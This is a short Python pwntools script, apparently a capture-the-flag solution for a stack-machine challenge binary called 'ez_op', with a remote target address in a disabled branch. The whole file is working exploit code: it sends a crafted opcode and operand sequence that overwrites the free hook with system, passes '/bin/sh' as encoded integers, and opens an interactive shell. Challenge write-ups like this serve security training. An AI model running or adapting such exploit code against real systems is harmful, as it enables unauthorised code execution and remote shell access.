from pwn import *
debug=1
context.log_level = 'debug'
if debug:
    io = process('./ez_op.dms')
else:
    io = remote("112.126.101.96",9999)
elf = ELF('./ez_op.dms')

s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)

load = -1
save = 0x10101010
push = 0x2A3D
pop  = 0xFFFF28
add  = 0x0
sub  = 0x11111
mul  = 0xABCEF
div  = 0x514

freeh=0x080E09F0 
system=0x08051C60
bin_sh=0x080B088F

def app(op):
    global c
    c+=" "
    c+=str(op)
#gdb.attach(io,"b *0x0804A127")
#opcode
c=''
app(push)
app(push)
app(push)
app(load)
app(push)
app(sub)
app(div)
app(push)
app(add)
app(save)
app(push)
app(push)
io.sendline(c)
#oprand
c=''
app(system)
app(4) 
app(67) 
app(freeh) 
app(1)
app(0x6e69622f)
app(0x0068732f)
io.sendline(c)

io.interactive()